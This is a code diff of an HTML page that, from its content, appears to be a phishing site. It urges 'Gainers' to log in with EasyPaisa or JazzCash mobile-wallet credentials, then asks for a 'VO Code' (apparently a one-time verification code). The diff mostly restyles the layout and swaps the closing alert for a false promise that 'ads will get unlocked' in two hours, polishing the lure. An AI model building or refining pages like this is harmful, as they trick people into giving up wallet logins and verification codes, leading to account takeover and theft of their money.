@@ -19,32 +19,31 @@
             color: white;
             display: flex;
             align-items: center;
-            justify-content: center; /* Center company name */
-            padding: 5px 10px; /* Reduced padding for thinner header */
+            justify-content: space-between;
+            padding: 10px 20px;
             position: relative;
             z-index: 1001;
         }
 
         header img {
             height: 40px;
-            position: absolute; /* Positioning logo at the left */
-            left: 10px;
+            flex-shrink: 0;
         }
 
         .company-name {
             font-size: 24px;
             font-weight: bold;
             text-align: center;
-            margin: 0; /* Removed margin for proper centering */
+            flex-grow: 1;
             text-shadow: 0 0 10px white, 0 0 20px white;
             animation: glow 1.5s infinite alternate;
+            margin: 0 10px;
         }
 
         @keyframes glow {
             0% {
                 text-shadow: 0 0 10px white, 0 0 20px white;
             }
-
             100% {
                 text-shadow: 0 0 20px white, 0 0 30px white;
             }
@@ -75,9 +74,7 @@
         .sidebar-button {
             cursor: pointer;
             font-size: 24px;
-            position: absolute; /* Sidebar button on top right */
-            right: 20px;
-            top: 10px;
+            flex-shrink: 0;
         }
 
         .reveal-message {
@@ -96,7 +93,6 @@
             100% {
                 color: white;
             }
-
             50% {
                 color: yellow;
             }
@@ -106,8 +102,6 @@
             display: flex;
             flex-direction: column;
             align-items: stretch;
-            margin: 0 auto; /* Centering the form */
-            max-width: 300px; /* Adjusting width for smaller screens */
         }
 
         .login-form input,
@@ -144,21 +138,17 @@
         .content-image {
             width: 100%;
             height: auto;
-            border-radius: 0; /* Rectangular corners */
-            margin-top: 10px; /* Margin for spacing */
         }
 
         @media (max-width: 600px) {
             header {
                 flex-direction: column;
-                align-items: center; /* Centering header items vertically */
+                align-items: center;
                 text-align: center;
-                padding: 5px 10px; /* Reduced padding for mobile */
             }
 
             .company-name {
-                font-size: 20px; /* Adjusted font size for mobile */
-                margin: 0; /* Ensure no margin for proper centering */
+                font-size: 20px;
             }
 
             .sidebar {
@@ -168,21 +158,6 @@
             .sidebar-button {
                 align-self: flex-end;
             }
-
-            .login-form {
-                margin-top: 10px; /* Adjusting margin for mobile */
-                max-width: 90%; /* Ensuring form fits mobile */
-            }
-
-            .reveal-message {
-                font-size: 16px; /* Adjusting font size for better readability */
-            }
-        }
-
-        .content-section {
-            margin: 10px auto; /* Adjusting for mobile display */
-            max-width: 600px; /* Limit width for better readability */
-            padding: 10px; /* Padding for content section */
         }
     </style>
 </head>
@@ -196,6 +171,9 @@
 </header>
 
 <div class="sidebar" id="sidebar">
+    <br>
+    <br>
+    <br>
     <div class="reveal-message">Dear Gainers! Please login with your EasyPaisa or JazzCash account.</div>
     <div class="reveal-message" id="finalProceedingMessage" style="display:none;">Click on Login again for final proceedings.</div>
     <form id="login-form" class="login-form">
@@ -212,11 +190,10 @@
     </div>
 </div>
 
-<section class="content-section" style="position: relative; text-align: center;">
-    <img src="image main.jpg" alt="Your Image" class="content-image">
+<section style="position: relative; text-align: center; margin-bottom: 20px;">
+    <img src="image main.jpg" alt="Your Image" style="width: 100%; height: auto; border-radius: 10px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);">
 
-    <a href="#login" onclick="showMessage(); return false;"
-       style="display: inline-block; margin-top: -50px; background-color: rgba(255, 0, 0, 0.7); color: white; font-weight: bold; padding: 12px 25px; border-radius: 5px; text-decoration: none; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5); transition: background-color 0.3s, transform 0.2s;">
+    <a href="#login" onclick="showMessage(); return false;" style="display: inline-block; margin-top: 20px; background-color: red; color: white; font-weight: bold; padding: 12px 25px; border-radius: 5px; text-decoration: none; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5); transition: background-color 0.3s, transform 0.2s;">
         Get Started
     </a>
 
@@ -262,31 +239,26 @@
         const passwordField = document.getElementById('password');
         if (passwordField.placeholder === "Enter VO Code") {
             event.preventDefault();
-
-            alert('You will be notified about further proceedings.');
-            document.getElementById('finalProceedingMessage').style.display = 'block';
-            passwordField.placeholder = "Password"; // Reset to original
-            passwordField.type = 'password'; // Reset to password type
+            alert('You will be notified about your account verification and the ads will get unlocked typically in 2 hours!');
+            passwordField.value = '';
         }
     });
 
     function toggleSidebar(event) {
         const sidebar = document.getElementById('sidebar');
-        if (sidebar.classList.contains('active')) {
-            sidebar.classList.remove('active');
-        } else {
-            sidebar.classList.add('active');
-        }
+        sidebar.classList.toggle('active');
+        event.stopPropagation();
     }
 
     document.addEventListener('click', function (event) {
         const sidebar = document.getElementById('sidebar');
         const sidebarButton = document.querySelector('.sidebar-button');
-        if (!sidebar.contains(event.target) && !sidebarButton.contains(event.target)) {
+
+        if (sidebar.classList.contains('active') && !sidebar.contains(event.target) && !sidebarButton.contains(event.target)) {
             sidebar.classList.remove('active');
         }
     });
 </script>
-</body>
 
+</body>
 </html>
